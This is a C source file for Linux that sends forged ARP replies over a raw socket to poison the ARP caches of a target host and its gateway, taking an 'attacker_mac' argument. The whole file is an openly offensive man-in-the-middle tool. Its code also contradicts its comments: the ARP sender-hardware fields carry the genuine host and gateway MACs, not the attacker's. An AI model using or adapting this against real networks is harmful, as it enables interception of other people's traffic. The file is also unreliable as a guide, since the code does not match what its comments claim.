#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <unistd.h>
#include <arpa/inet.h>

#define ETH_HDR_LEN sizeof(struct ether_header)
#define ARP_PKT_LEN sizeof(struct ether_arp)
#define BUF_SIZE   (ETH_HDR_LEN + ARP_PKT_LEN)

// parse “aa:bb:cc:dd:ee:ff” into 6 bytes
int parse_mac(const char *str, unsigned char *bytes) {
    int vals[6];
    if (6 == sscanf(str, "%x:%x:%x:%x:%x:%x",
                    &vals[0], &vals[1], &vals[2],
                    &vals[3], &vals[4], &vals[5])) {
        for (int i = 0; i < 6; i++) bytes[i] = (unsigned char)vals[i];
        return 0;
    }
    return -1;
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        fprintf(stderr,
            "Usage: %s <iface> <host_ip> <host_mac> "
            "<gw_ip> <gw_mac> <attacker_mac>\n",
            argv[0]
        );
        return EXIT_FAILURE;
    }

    const char *iface        = argv[1];
    const char *host_ip_str  = argv[2];
    const char *host_mac_str = argv[3];
    const char *gw_ip_str    = argv[4];
    const char *gw_mac_str   = argv[5];
    const char *atk_mac_str  = argv[6];

    unsigned char host_mac[6], gw_mac[6], atk_mac[6];
    if (parse_mac(host_mac_str, host_mac) ||
        parse_mac(gw_mac_str,   gw_mac)  ||
        parse_mac(atk_mac_str,  atk_mac)) {
        fprintf(stderr, "Invalid MAC format\n");
        return EXIT_FAILURE;
    }

    struct in_addr host_ip, gw_ip;
    if (inet_pton(AF_INET, host_ip_str, &host_ip) != 1 ||
        inet_pton(AF_INET, gw_ip_str,   &gw_ip)   != 1) {
        fprintf(stderr, "Invalid IP address\n");
        return EXIT_FAILURE;
    }

    // raw socket for ARP
    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    // interface index
    int ifindex = if_nametoindex(iface);
    if (ifindex == 0) {
        perror("if_nametoindex");
        close(sock);
        return EXIT_FAILURE;
    }

    // common buffers
    unsigned char buffer[BUF_SIZE];
    struct ether_header *eh = (struct ether_header*)buffer;
    struct ether_arp    *arp = (struct ether_arp*)(buffer + ETH_HDR_LEN);
    struct sockaddr_ll   sa = {0};
    sa.sll_family   = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex  = ifindex;
    sa.sll_halen    = ETH_ALEN;

    // --- 1) Poison gateway: “host_ip is at atk_mac” (unicast) ---
    // Ethernet header
    memcpy(eh->ether_shost, atk_mac, ETH_ALEN);
    memcpy(eh->ether_dhost, gw_mac, ETH_ALEN);
    eh->ether_type = htons(ETH_P_ARP);
    // ARP payload
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = ETH_ALEN;
    arp->ea_hdr.ar_pln = sizeof(in_addr_t);
    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);
    memcpy(arp->arp_sha, host_mac, ETH_ALEN);      // pretend to be host
    memcpy(&arp->arp_spa, &host_ip, sizeof(host_ip));
    memcpy(arp->arp_tha, gw_mac, ETH_ALEN);
    memcpy(&arp->arp_tpa, &gw_ip, sizeof(gw_ip));
    // send
    memcpy(sa.sll_addr, gw_mac, ETH_ALEN);
    if (sendto(sock, buffer, BUF_SIZE, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("sendto gateway");
    }

    // --- 2) Poison host: “gw_ip is at atk_mac” (broadcast → host’s cache) ---
    unsigned char bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    // Ethernet header: broadcast
    memcpy(eh->ether_shost, atk_mac, ETH_ALEN);
    memcpy(eh->ether_dhost, bcast,   ETH_ALEN);
    eh->ether_type = htons(ETH_P_ARP);
    // ARP payload: target is host_mac
    memcpy(arp->arp_sha, gw_mac, ETH_ALEN);        // pretend to be GW
    memcpy(&arp->arp_spa, &gw_ip, sizeof(gw_ip));
    memcpy(arp->arp_tha, host_mac, ETH_ALEN);
    memcpy(&arp->arp_tpa, &host_ip, sizeof(host_ip));
    // send
    memcpy(sa.sll_addr, bcast, ETH_ALEN);
    if (sendto(sock, buffer, BUF_SIZE, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("sendto host");
    }

    close(sock);
    return EXIT_SUCCESS;
}